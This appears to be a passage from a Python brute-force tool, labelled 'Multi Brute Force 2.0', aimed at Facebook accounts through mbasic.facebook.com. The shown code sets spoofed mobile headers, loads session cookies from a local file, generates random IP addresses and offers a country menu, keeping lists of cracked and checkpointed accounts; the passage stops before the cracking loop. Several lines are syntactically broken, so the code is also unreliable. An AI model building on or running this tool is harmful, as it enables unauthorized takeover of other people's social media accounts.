#!/usr/bin/python3

#-*-coding:utf-8-*-

# Made With ❤️ By Hassan

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress

from random import randint

from concurrent.futures import ThreadPoolExecutor as ThreadPool

from datetime import date

from datetime import datetime

current = datetime.now()

p = "\1b[0;37m" # putih

m = "\1b[0;31m" # merah

h = "\1b[0;32m" # hijau

k = "\1b[0;33m" # kuning

b = "\1b[0;34m" # biru

u = "\1b[0;35m" # ungu

o = "\1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\33[0m"

        G = "\33[1;92m"

        O = "\33[1;97m"

        R = "\33[1;91m"

else:

        N = ""

        G = ""

        O = ""

        R = ""

### HEADERS ###

def banner():

    print("""\1b[0;37m   ___                   \  / _ \______             ® \ / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\/_/  /_/__\_/(_) Force 2.0  │  Script By Dapunta Khurayra  │\       /  ^ \ / // /  ^ \  │   •• Github.com/Hassan ••   │\      /_/_/_/_/\,_/_/_/_/   └──────────────────────────────┘""")

host="https://mbasic.facebook.com"

ok = []

cp = []

ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))

tahun = current.year

bulan = current.month

hari = current.day

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1

MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():

	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))def random_ipv6():

	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def jalan(z):

	for e in z + "\":

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.03)

def clear():

	if " linux" in sys.platform.lower():

		os.system("clear")

	elif "win" in sys.platform.lower():

		os.system("cls")

	else:os.system("clear")

    

def lang(cookies):

	f=False

	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")

	for i in rr.find_all("a",href=True):

		if "id_ID" in i.get("href"):

			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())

			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	

			if "apa yang anda pikirkan sekarang" in b.lower():

				f=True

	if f==True:

		return True

	else:

		exit("[!] Wrong Cookies")

def basecookie():

	if os.path.exists(".cok"):

		if os.path.getsize(".cok") !=0:

			return gets_dict_cookies(open('.cok').read().strip())

		else:logs()

	else:logs()

def hdcok():

	global host

	hosts=host

	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}

	return r

def gets_cookies(cookies):

	result=[]

	for i in enumerate(cookies.keys()):

		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])

		else:result.append(i[1]+"="+cookies[i[1]]+"; ")

	return "".join(result)

def gets_dict_cookies(cookies):

	result={}

	try:

		for i in cookies.split(";"):

			result.update({i.split("=")[0]:i.split("=")[1]})

		return result

	except:

		for i in cookies.split("; "):

			result.update({i.split("=")[0]:i.split("=")[1]})

		return result

def country():

    os.system("clear")

    banner()

    print("\%s[%s Choose Country %s]\"%(k,p,k))

    print("%s[%s1%s] %sIndonesia"%(k,p,k,p))

    print("%s[%s2%s] %sBangladesh/India"%(k,p,k,p))

    print("%s[%s3%s] %sPakistan"%(k,p,k,p))

    print("%s[%s4%s] %sUSA"%(k,p,k,p))

    print("%s[%s0%s] %sNone"%(k,p,k,p))

    choose_country()

    

def choose_country():

    cc = input("\%s[%s•%s] %sChoose : "%(k,p,k,p))

    if cc in[""]:

        print((k+"\["+p+"!"+k+"]"+p+" Fill In The Correct"))

    elif cc in["1","01"]:

        os.system("rm -rf country.txt")

        cou = "id"

        try:

            ctry = open('country.txt','w')

            ctry.write(cou)

            ctry.close()

            menu()

        except (KeyError, IOError):

            menu()

    elif cc in["2","02"]:

        os.system("rm -rf country.txt")

        cou = "bd"

        try:

            ctry = open('country.txt','w')

            ctry.write(cou)

            ctry.close()

            menu()

        except (KeyError, IOError):

            menu()

    elif cc in["3","03"]:

        os.system("rm -rf country.txt")

        cou = "pk"

        try:

            ctry = open('country.txt','w')

            ctry.write(cou)

            ctry.close()

            menu()
